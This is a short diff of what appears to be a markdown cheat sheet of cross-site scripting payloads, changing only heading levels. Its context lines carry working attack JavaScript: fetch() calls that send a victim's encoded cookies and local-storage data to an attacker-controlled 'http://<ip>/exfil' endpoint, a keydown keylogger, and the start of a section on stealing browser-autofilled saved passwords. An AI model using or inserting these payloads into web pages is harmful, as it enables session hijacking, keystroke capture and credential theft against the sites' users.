@@ -68,7 +68,7 @@ let encodedCookie = encodeURIComponent(cookie);
 fetch("http://<ip>/exfil?data=" + encodedCookie);
 ```
 
-## Local Storage Data Exfiltration
+### Local Storage Data Exfiltration
 
 To retrieve data from the local storage of a website:
 
@@ -78,7 +78,7 @@ let encodedData = encodeURIComponent(data);
 fetch("http://<ip>/exfil?data=" + encodedData);
 ```
 
-## Keylogging
+### Keylogging
 
 To implement keylogging on a website:
 
@@ -90,7 +90,7 @@ function logKey(event) {
 document.addEventListener('keydown', logKey);
 ```
 
-## Stealing Saved Passwords
+### Stealing Saved Passwords
 
 To steal saved passwords, assuming that the Chrome browser automatically fills in the password in the input field created by us:
 
